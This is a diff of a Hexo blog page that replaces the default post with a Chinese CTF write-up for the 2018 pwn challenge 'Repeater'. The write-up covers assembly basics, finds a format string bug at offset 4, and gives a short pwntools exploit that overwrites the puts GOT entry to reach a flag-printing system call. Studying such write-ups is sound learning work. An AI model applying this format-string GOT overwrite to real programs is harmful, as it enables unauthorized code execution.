@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Hello World | W1therC&#39;s blog</title>
+  <title>[Pwn]2018年山东省科来杯Pwn题目Repeater复现 | W1therC&#39;s blog</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -169,38 +169,40 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2022-05-10T09:10:48.648Z" itemprop="datePublished">
-          2022-05-10
+      <time datetime="2022-05-12T08:57:10.000Z" itemprop="datePublished">
+          2022-05-12
       </time>
     
 </span>
-                <h1>Hello World</h1>
+                <h1>[Pwn]2018年山东省科来杯Pwn题目Repeater复现</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+      		<h1 id="2018年山东省科来杯Pwn题目Repeater复现"><a href="#2018年山东省科来杯Pwn题目Repeater复现" class="headerlink" title="2018年山东省科来杯Pwn题目Repeater复现"></a>2018年山东省科来杯Pwn题目Repeater复现</h1><h2 id="补充一点汇编语言基础知识"><a href="#补充一点汇编语言基础知识" class="headerlink" title="补充一点汇编语言基础知识"></a>补充一点汇编语言基础知识</h2><p>对于我这种对汇编语言不怎么感冒的人来说，补充一些相应的汇编语言的基础知识还是很重要的</p>
+<p>这里就针对本题中用到的汇编指令进行相应补充</p>
+<p>lea与mov的区别：lea eax,[ebx+8]就是将ebx+8这个值直接赋给eax (相当于把地址赋给eax)，而不是把ebx+8处的内存地址里的数据赋给eax。</p>
+<p>而mov指令则恰恰相反，例如：<br>mov eax,[ebx+8]则是把内存地址为ebx+8处的数据赋给eax。</p>
+<p>cmp(compare)指令进行比较两个操作数的大小，若执行指令后ZF&#x3D;1<br>则说明两个数相等，因为zero为1说明结果为0。</p>
+<p>jnz结果不为零（或不相等）则转移，jz即零标志为1就跳转。<br>ZF汇编语言中的PSW标志寄存器中的一位，而JZ则是根据ZF决定是否跳转。<br>jz&#x3D;jump if zero，即零标志为1就跳转，一般与cmp连用，用以判断两数是否相等。jz的另一种写法就是je，je&#x3D;jump if equal，jz和je的作用是完全一样的。</p>
+<h2 id="Repeater-WP"><a href="#Repeater-WP" class="headerlink" title="Repeater WP"></a>Repeater WP</h2><p>checksec 一下题目所给文件<br><img src="https://img-blog.csdnimg.cn/20201030103445340.png#pic_center" alt="在这里插入图片描述"><br>运行一下试试看<br><img src="https://img-blog.csdnimg.cn/20201030104011498.png#pic_center" alt="在这里插入图片描述"><br>好像看不出什么<br>测试一下格式化字符串漏洞<br><img src="https://img-blog.csdnimg.cn/20201030104054282.png#pic_center"><br>数一下 偏移为4<br>丢进ida看一下主程序<br>ctrl 1 看一下字符串，发现敏感字符串<br><img src="https://img-blog.csdnimg.cn/20201030104207828.png#pic_center" alt="在这里插入图片描述"><br>双击 ctrl x 跟进<br><img src="https://img-blog.csdnimg.cn/20201030104347614.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNjA3OTEx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以发现程序有call语句调用system，而system就是输出flag地址从而得到flag</p>
+<p>但是根据上面的汇编语句或者getflag字段内容可以发现这里存在一个判断语句<br><img src="https://img-blog.csdnimg.cn/20201030104723973.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030104802774.png#pic_center" alt="在这里插入图片描述"><br>2018h &#x3D; (8216)₁₀，判断 eax是否等于8216 ，ZF&#x3D;1则两数相等，相应的ZF&#x3D;1意味着结果为0，即jnz不跳转。随即执行将eax压入栈，再执行call语句调用，即可得到flag。</p>
+<p>根据偏移为4 编写exp脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./repeater&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./repeater&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;your msg:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">4</span>,&#123;puts_got:<span class="number">0x8048638</span>&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>运行即可得到flag</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
     
-    <a class="pull-left" href="/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" style="float: left;">
-        ← scrapy quotesbot 源码分析
+    <a class="pull-left" href="/2022/05/12/111/" style="float: left;">
+        ← [Pwn]攻防世界pwn题目wp--guess_num,hello_pwn
     </a>
     
+    
+    <a class="pull-right" href="/2022/05/12/scrapy%20quotesbot%20%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">
+        scrapy quotesbot 源码分析 →
+    </a>
     
 </nav>
 
